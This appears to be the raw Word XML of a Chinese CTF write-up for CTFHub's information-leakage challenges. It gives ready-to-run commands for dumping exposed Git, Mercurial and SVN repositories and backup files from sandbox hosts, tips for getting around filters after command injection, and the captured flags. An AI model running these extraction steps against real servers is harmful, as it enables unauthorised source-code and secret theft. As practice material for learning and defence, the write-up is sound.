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task9</w:t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第一章 环境安装（0.5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1.3 基础 Linux 命令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1.3.1 目录与文件列举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ls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作用：列当前目录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本次使用场景：命令注入后第一句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ls -la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作用：列出含隐藏文件、权限、大小、时间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本次使用场景：判断 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>flag_xxx.php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是不是目录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pwd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作用：当前工作目录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本次使用场景：一步定位 web 根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find / -name "*flag*"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作用：按名字全盘找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本次使用场景：找 flag 文件（别加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-maxdepth</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，会漏）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find / -name index.php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作用：按已知文件名反推目录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本次使用场景：找 web 根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file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stat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作用：判断文件类型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1.3.2 文件读取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cat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：最常用，但常被过滤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tac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：cat 反过来，按行逆序输出 —— 绕过 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 过滤的首选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head -1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tail</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：取前/后 N 行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sort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nl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rev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：排序 / 加行号 / 反转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base64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：编码输出 —— 避开 HTML 特殊字符的神器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grep -r "ctfhub" /var/www/html/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：按内容找文件（最准）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xxd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od</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：十六进制查看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strings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：从二进制里捞可打印字符串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1.3.3 内容特征查找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grep -r ctfhub /var/www/html/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：一步出"路径 + 文件名 + 内容"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grep -ro "ctfhub{[^}]*}" /</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：只输出匹配部分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strings .hg/store/00changelog.i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：从二进制元数据里找明文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od -A d -t x1z file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：十六进制 + ASCII 双栏，看文件头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1.3.4 数据处理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base64 -d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：解码（GNU 版宽容，会自动跳过非 base64 字符）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openssl base64 -d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：严格版，遇到垃圾字符直接失败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grep -oE '^[A-Za-z0-9+/=]+'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：从混有 HTML 的响应里抠出 base64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sed 's/&lt;.*//'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cut -d'&lt;' -f1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：砍掉 HTML 尾巴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awk '{print $4"\t"$2}'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：取指定列（Git index 差集用）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comm -23 &lt;(...) &lt;(...)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：求差集（Git Index 题核心）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tr -d '\000'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：去掉 NUL 字节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1.3.5 版本库工具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git</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：Git 泄露题的全部操作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sqlite3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：读 SVN 的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wc.db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hg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（mercurial）：读 HG 的 revlog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svn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：复刻 SVN 仓库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rip-svn.pl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rip-hg.pl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：dvcs-ripper 的自动化脚本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php_filter_chain_generator.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：生成 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://filter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 过滤器链 RCE payload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第二章 信息泄露漏洞（1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2.1 模块总览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CTFHub「信息泄露」模块 9 题全部通关：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题型：网站源码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ctfhub{95c6f03d7cda19058d88ec1f}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关键技术：备份包字典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题型：bak 文件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ctfhub{ff20cd30144373eedaa01abc}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关键技术：后缀爆破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题型：vim 缓存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ctfhub{1bbffdd2cca2f93ddc0ca8d8}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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.swp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 结构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题型：.DS_Store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ctfhub{2e801a81a591f99ffca80e07}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关键技术：macOS 元数据解析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题型：Git Log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ctfhub{dc8b0894d5a5689a22a35ffe}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关键技术：reflog + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>git show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题型：Git Stash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ctfhub{03f0f3f844084d7134cedad3}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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>refs/stash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题型：Git 未删变体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ctfhub{b0571eeb61f6343ced553555}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关键技术：reflog 只有 2 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8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题型：SVN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ctfhub{6fd7676ba56da2a90a11af9a}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关键技术：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wc.db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PRISTINE.refcount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9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题型：HG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ctfhub{9260b70ead69a60fb2e0d968}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关键技术：revlog + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>→</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>__</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 编码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另有两道独立复现（非模块题，用于验证"不是抄 WP"）：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Git Log 独立复现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ctfhub{009ee4ed36138139d7349d59}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说明：换实例重新走一遍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Git Stash 独立复现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ctfhub{053da77b26b117ed9a380b03}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说明：同上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HG 第二实例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ctfhub{52dd316df7c89131d95b8161}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说明：验证文件名随机化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第一轮（更早的记录，同模块）：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ctfhub{1e5a12263055250cb6c8f170}   302 跳转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ctfhub{cf2690f992c9ebe484432aee}   Cookie 伪造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ctfhub{db7ba83bb0e787993a2fa43f}   基础认证 1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ctfhub{b227a7576366a4be3848faa5}   基础认证 2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ctfhub{d5b85603ca77329a3ae5a18}   Git 历史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2.2 五类信息泄露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2.2.1 四道仓库泄露题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i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>四道题的命令就是解法。每段代码照抄即可复现，注释里标了每一步在干什么。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题目 1 · Git Log（`.git` 泄露）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T="http://challenge-41019ce7441deaee.sandbox.ctfhub.com:10800/"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"$T/.git/HEAD"              # ref: refs/heads/master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"$T/.git/logs/HEAD"         # ← 关键的一步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~/tools/githack/GitHack-master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python2 GitHack.py "$T/.git"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dist/challenge-41019ce7441deaee.sandbox.ctfhub.com_10800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show 4d330484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判据：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>logs/HEAD</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里出现 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>commit: add flag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 w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>commit: remove flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 两行 → 取 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>add flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 那一行的第二列哈希，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>git show</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 它。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ctfhub{dc8b0894d5a5689a22a35ffe}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题目 2 · Git Stash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"$T/.git/HEAD"              # ref: refs/heads/master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"$T/.git/logs/HEAD"         # 4 条 ← 注意比上一题多一行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~/tools/githack/GitHack-master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python2 GitHack.py "$T/.git"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dist/challenge-f853c2afa0df69bb.sandbox.ctfhub.com_10800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ls                                   # 50x.html  index.html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判据：reflog 变成 4 条，多出来的那行是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>reset: moving to HEAD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Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>refs/stash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 200。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补一条取 flag：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stash show -p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ctfhub{03f0f3f844084d7134cedad3}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题目 3 · Git Index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T="http://challenge-xxx:10800"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────────── 探测（4 条）──────────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"$T/.git/HEAD"                                          # ① 是 git 吗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"$T/.git/logs/HEAD" | sed 's/.*\t//'                    # ② 看剧情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-o /dev/null -w "%{http_code}\n" "$T/.git/refs/stash"   # ③ 有 stash 吗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-o /dev/null -w "%{http_code}\n" "$T/.git/objects/"     # ④ 403→GitHack / 200→wget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────────── 搬运（2 条）──────────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python2 ~/tools/githack/GitHack-master/GitHack.py "$T/.git/"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~/tools/githack/GitHack-master/dist/$(ls -t ~/tools/githack/GitHack-master/dist/ | head -1)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────────── 挖（4 条全打，5 秒）──────────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ls &amp;&amp; cat *.txt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log --all -p | grep -i ctfhub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stash show -p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diff --cached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判据：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>git diff --cached</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 有输出 = index 里有 HEAD 没有的文件（flag 从没被 commit 过）。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flag：本地复刻 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>flag{index_staged_never_committed}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（CTFHub 该实例未留记录）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题目 4 · HG（Mercurial）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T="http://challenge-xxx:10800"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① 探测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② 拿文件名（dirstate 里 strings）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"$T/.hg/dirstate" | strings | grep -E '\.(txt|php|py)$'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③ 关键：名字里的 _ 变成 __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   flag_807728508.txt  →  flag__807728508.txt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④ 取内容 + 抓 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"$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'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判据：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/.hg/requires</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 200。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两个关键：文件名里的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 要写成 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>__</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">；revlog 首字节 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'u'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>(0x75) 表示是原文不是 zlib。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ctfhub{9260b70ead69a60fb2e0d968}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补充：`.git` 里到底有什么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全部源码（每个版本）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位置：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>objects/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危害：完整源码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全部提交历史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位置：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>objects/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refs/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危害：开发过程、注释里的密码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未提交改动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位置：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>index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危害：暂存区敏感文件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被"藏起来"的改动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位置：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>refs/stash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危害：连 commit 都没进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被"删掉"的东西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位置：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>objects/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logs/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危害：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>git rm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 删不掉对象</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b/>
          <w:color w:val="2E548A"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>补充：万能兜底（不判断题型，扫全部对象）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cat-file --batch-all-objects --batch-check='%(objecttype) %(objectname)'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| awk '$1=="blob"{print $2}'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| while read -r h;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c=$(git cat-file -p "$h" 2&gt;/dev/null | grep -oE '(ctfhub|flag)\{[^}]*\}' | head -1)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[ -n "$c" ] &amp;&amp; echo "★ $h → $c"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done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2.2.2 备份文件下载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六个载体：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网站源码包：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>www.zip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web.tar.gz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backup.zip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site.rar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后缀变体：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.bak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.old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.orig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.save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.swp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.copy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.tmp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.txt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.1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~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编辑器缓存（vim 系列，见 2.3）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系统元数据：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.DS_Store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Thumbs.db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desktop.ini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配置密钥：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Dockerfile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docker-compose.yml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.gitlab-ci.yml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IDE 工程：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.idea/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.vscode/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.settings/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*.iml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为什么 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.bak</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 能读源码：服务器按最后扩展名决定解析。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index.php.bak  →  .bak  →  静态文件  →  原样输出 ✅ 泄露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index.bak.php  →  .php  →  交给 PHP  →  不泄露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2.2.3 SVN 泄露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成因：在 web 目录 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>svn checkout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 xml:space="preserve"> 留在 web 根。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正确做法：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>svn export</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">（不带 </w:t>
      </w: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两代结构：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≤ 1.6</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet2"/>
      </w:pP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 xml:space="preserve"> 位置：每个子目录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元数据：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>entries</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（纯文本，有文件列表）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内容：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>text-base/&lt;名&gt;.svn-base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≥ 1.7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet2"/>
      </w:pP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 xml:space="preserve"> 位置：只有根目录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元数据：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wc.db</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（SQLite）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内容：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
